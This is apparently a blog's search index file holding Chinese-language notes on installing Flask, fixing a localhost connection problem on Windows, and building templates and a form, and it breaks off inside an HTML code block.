<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>第一篇文章</title>
      <link href="/2024/07/06/2024-07-06-%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
      <url>/2024/07/06/2024-07-06-%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<p>这是我的第一篇文章。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安装笔记(Flask,docker+wsl)</title>
      <link href="/2024/03/24/2024-03-24-Flask%E5%AE%89%E8%A3%85%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/03/24/2024-03-24-Flask%E5%AE%89%E8%A3%85%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装pip-exe文件"><a href="#安装pip-exe文件" class="headerlink" title="安装pip.exe文件"></a>安装pip.exe文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m ensurepip</span><br></pre></td></tr></table></figure><h3 id="安装flask"><a href="#安装flask" class="headerlink" title="安装flask"></a>安装flask</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask</span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">note: This error originates from a subprocess, and is likely not a problem with pip.</span><br><span class="line">error: subprocess<span class="literal">-exited-wi</span> th<span class="literal">-error</span></span><br><span class="line">× pip subprocess to install build dependencies did not run successfully.</span><br><span class="line"><span class="keyword">exit</span> code: <span class="number">2</span></span><br><span class="line"> → See above <span class="keyword">for</span> output.</span><br></pre></td></tr></table></figure><p>错误原因：缺少了两个依赖的库</p><p>解决</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller</span><br><span class="line">pip install wheel</span><br></pre></td></tr></table></figure><p>重新运行pip install flask命令，成功。</p><h2 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h2><p>创建flask文件夹，在命令行中进入这个目录后创建venv文件夹并激活解释器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m venv venv</span><br><span class="line">venv\Scripts\activate</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(venv) $ pip install flask</span><br></pre></td></tr></table></figure><p>（不确定是否需要，在虚拟环境内外都安装了一遍）</p><h2 id="编写程序"><a href="#编写程序" class="headerlink" title="编写程序"></a>编写程序</h2><p>创建文件夹app，在里面新建两个.py文件</p><p><code>__init__.py</code>写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask <span class="comment"># 引入Flask对象</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__) <span class="comment"># 创建Flask实例</span></span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> routes <span class="comment">#引入route模块（循环引入）</span></span><br></pre></td></tr></table></figure><p><code>routes.py</code>写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app <span class="comment"># 第一个app指app包，第二个app指app实例。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span><span class="comment"># 用装饰器定义的超链接</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): <span class="comment"># 视图函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span></span><br></pre></td></tr></table></figure><p>定义了一个返回<code>Hello, World!</code>字符串的视图函数。</p><p>返回上级目录新建<code>microblog.py</code>，写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app</span><br></pre></td></tr></table></figure><p>这样就定义了一个应用入口以启动应用。</p><p>也可以不分开模块，只建立主程序，在其中写进需要的函数以触发函数和启动应用。</p><p><strong>app.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(venv)<span class="variable">$</span> flask run</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* Debug mode: off</span><br><span class="line">WARNING: This is a development server. <span class="keyword">Do</span> not use it <span class="keyword">in</span> a production deployment. Use a production WSGI server insteac</span><br><span class="line">Running on http:// <span class="number">127.0</span>.<span class="number">0</span>. <span class="number">1</span>:<span class="number">5000</span></span><br><span class="line">Press CTRL+C to quit </span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>一一[<span class="number">19</span>/<span class="type">Mar</span>/<span class="number">2024</span> <span class="number">13</span>:<span class="number">13</span>:<span class="number">12</span>] GET / HTTP/<span class="number">1.1</span>” <span class="number">200</span></span><br></pre></td></tr></table></figure><p>浏览器打开本机的5000端口，成功运行。</p><p>如果上一步使用了方法二，可以直接执行app.py文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> python app.py</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> * Serving Flask app <span class="string">&#x27;app&#x27;</span></span><br><span class="line"> * Debug mode: on</span><br><span class="line">WARNING: This is a development server. <span class="keyword">Do</span> not use it <span class="keyword">in</span> a production deployment. Use a production WSGI server instead.</span><br><span class="line"> * Running on http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span></span><br><span class="line">Press CTRL+C to quit</span><br><span class="line"> * Restarting with stat</span><br><span class="line"> * Debugger is active!</span><br><span class="line"> * Debugger PIN: <span class="number">121</span><span class="literal">-096-704</span></span><br></pre></td></tr></table></figure><p>浏览器打开本机8080端口，报错：<strong>127.0.0.1</strong> 已拒绝连接。</p><p>自查原因：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping localhost</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">正在 Ping DESKTOP<span class="literal">-DF7NKT4</span> [::<span class="number">1</span>] 具有 <span class="number">32</span> 字节的数据:</span><br><span class="line">来自 ::<span class="number">1</span> 的回复: 时间&lt;<span class="number">1</span>ms</span><br><span class="line">来自 ::<span class="number">1</span> 的回复: 时间&lt;<span class="number">1</span>ms</span><br><span class="line">来自 ::<span class="number">1</span> 的回复: 时间&lt;<span class="number">1</span>ms</span><br><span class="line">来自 ::<span class="number">1</span> 的回复: 时间&lt;<span class="number">1</span>ms</span><br><span class="line"></span><br><span class="line">::<span class="number">1</span> 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 = <span class="number">4</span>，已接收 = <span class="number">4</span>，丢失 = <span class="number">0</span> (<span class="number">0</span>% 丢失)，</span><br><span class="line">往返行程的估计时间(以毫秒为单位):</span><br><span class="line">    最短 = <span class="number">0</span>ms，最长 = <span class="number">0</span>ms，平均 = <span class="number">0</span>ms</span><br></pre></td></tr></table></figure><p>解决问题：</p><p>1.安装IIS</p><p>控制面板-程序-程序和功能-启用或关闭Windows功能，勾上Internet Information Services与Internet Information Services可承载的Web核心</p><p>2.修改C:\Windows\System32\drivers\etc下的hosts文件，在末尾加上下面两行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 localhost</span><br><span class="line">localhost 127.0.0.1</span><br></pre></td></tr></table></figure><p>3.修改ipv6优先级</p><p>管理员：Windows PowerShell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface ipv6 show prefixpolicies</span><br></pre></td></tr></table></figure><p>windows的优先解析列表中ipv6的优先级高于ipv4</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">查询活动状态...</span><br><span class="line"></span><br><span class="line">优先顺序    标签   前缀</span><br><span class="line"><span class="literal">----------</span>  <span class="literal">-----</span>  <span class="literal">--------------------------------</span></span><br><span class="line">        <span class="number">50</span>      <span class="number">0</span>  ::<span class="number">1</span>/<span class="number">128</span></span><br><span class="line">        <span class="number">40</span>      <span class="number">1</span>  ::/<span class="number">0</span></span><br><span class="line">        <span class="number">35</span>      <span class="number">4</span>  ::ffff:<span class="number">0</span>:<span class="number">0</span>/<span class="number">96</span></span><br><span class="line">        <span class="number">30</span>      <span class="number">2</span>  <span class="number">2002</span>::/<span class="number">16</span></span><br><span class="line">         <span class="number">5</span>      <span class="number">5</span>  <span class="number">2001</span>::/<span class="number">32</span></span><br><span class="line">         <span class="number">3</span>     <span class="number">13</span>  fc00::/<span class="number">7</span></span><br><span class="line">         <span class="number">1</span>     <span class="number">11</span>  fec0::/<span class="number">10</span></span><br><span class="line">         <span class="number">1</span>     <span class="number">12</span>  <span class="number">3</span>ffe::/<span class="number">16</span></span><br><span class="line">         <span class="number">1</span>      <span class="number">3</span>  ::/<span class="number">96</span></span><br></pre></td></tr></table></figure><p>修改优先级：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">netsh int ipv6 set prefix ::/96 50 0</span><br><span class="line">netsh int ipv6 set prefix ::ffff:0:0/96 40 1</span><br><span class="line">netsh int ipv6 set prefix 2002::/16 35 2</span><br><span class="line">netsh int ipv6 set prefix 2001::/32 30 3</span><br><span class="line">netsh int ipv6 set prefix ::1/128 10 4</span><br><span class="line">netsh int ipv6 set prefix ::/0 5 5</span><br><span class="line">netsh int ipv6 set prefix fc00::/7 3 13</span><br><span class="line">netsh int ipv6 set prefix fec0::/10 1 11</span><br><span class="line">netsh int ipv6 set prefix 3ffe::/16 1 12</span><br></pre></td></tr></table></figure><p>重试，成功运行。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> - - [<span class="number">22</span>/<span class="type">Mar</span>/<span class="number">2024</span> <span class="number">13</span>:<span class="number">53</span>:<span class="number">27</span>] <span class="string">&quot;GET / HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br></pre></td></tr></table></figure><h2 id="使用HTML模板"><a href="#使用HTML模板" class="headerlink" title="使用HTML模板"></a>使用HTML模板</h2><p>使用拼接的HTML字符串来展示user字典的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/greet&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>():</span><br><span class="line">    user = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="string">&quot;20&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Templating&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Hello, &#x27;&#x27;&#x27;</span> + user[<span class="string">&#x27;username&#x27;</span>] + <span class="string">&#x27;&#x27;&#x27;!, you’re &#x27;&#x27;&#x27;</span> + user[<span class="string">&#x27;age&#x27;</span>] + <span class="string">&#x27;&#x27;&#x27; years old.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125; - microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;user.nickname&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&#123;&#123;&#125;&#125;</code>中存放<strong>动态内容</strong>，可以从视图函数中传入。</p><h3 id="视图函数中使用html模板"><a href="#视图函数中使用html模板" class="headerlink" title="视图函数中使用html模板"></a>视图函数中使用html模板</h3><p>为了渲染模板，Flask框架提供了名为render_template的新函数，该函数需要传入模板名以及一些模板参数的变量列表，返回一个所有占位符都被传入的变量替换的字符串结构。用模板参数提供的相应值替换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = &#123; <span class="string">&#x27;nickname&#x27;</span>: <span class="string">&#x27;Miguel&#x27;</span> &#125; <span class="comment"># 定义变量</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,</span><br><span class="line">        title = <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">        user = user)<span class="comment">#传入模板名、模板变量列表</span></span><br></pre></td></tr></table></figure><h3 id="模板中的条件、循环、继承语句"><a href="#模板中的条件、循环、继承语句" class="headerlink" title="模板中的条件、循环、继承语句"></a>模板中的条件、循环、继承语句</h3><h4 id="条件控制"><a href="#条件控制" class="headerlink" title="条件控制"></a>条件控制</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    &#123;% if title %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125; - microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    &#123;% else %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;user.nickname&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a>循环控制</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    &#123;% if title %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125; - microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    &#123;% else %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hi, &#123;&#123;user.nickname&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    &#123;% for post in posts %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;post.author.nickname&#125;&#125; says: <span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;&#123;post.body&#125;&#125;<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h4><p>把所有模板公共的部分移除出页面的布局，把它们放在一个基础模板中，所有使用它的模板可以继承该基础模板。</p><h5 id="基础模板-base-html"><a href="#基础模板-base-html" class="headerlink" title="基础模板(base.html)"></a>基础模板(base.html)</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    &#123;% if title %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125; - microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    &#123;% else %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>Microblog: <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>#设置导航窗口</span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    &#123;% block content %&#125;&#123;% endblock %&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用 block 控制语句来定义派生模板content可以插入的位置</p><h5 id="继承模板（index-html）"><a href="#继承模板（index-html）" class="headerlink" title="继承模板（index.html）"></a>继承模板（index.html）</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;base.html&quot; %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hi, &#123;&#123;user.nickname&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% for post in posts %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;post.author.nickname&#125;&#125; says: <span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;&#123;post.body&#125;&#125;<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>使用extends 语句建立两个模板的继承关系。</p><h2 id="使用表单"><a href="#使用表单" class="headerlink" title="使用表单"></a>使用表单</h2><p>创建表单收集信息，将模板文件命名为<code>bio_form.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Bio Data Form<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;showbio&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Hobbies<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>视图函数<code>bio_data_form</code>同时支持POST和GET请求。GET请求将渲染<code>bio_form.html</code>模板，而POST请求将重定向到<code>showbio</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/form&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bio_data_form</span>():    </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]        </span><br><span class="line">        age = request.form[<span class="string">&#x27;age&#x27;</span>]        </span><br><span class="line">        email = request.form[<span class="string">&#x27;email&#x27;</span>]        </span><br><span class="line">        hobbies = request.form[<span class="string">&#x27;hobbies&#x27;</span>]        </span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;showbio&#x27;</span>,                              </span><br><span class="line">                                username=username,</span><br><span class="line">                                age=age,</span><br><span class="line">                                email=email,   </span><br><span class="line">                                hobbies=hobbies))    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;bio_form.html&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>show_bio.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 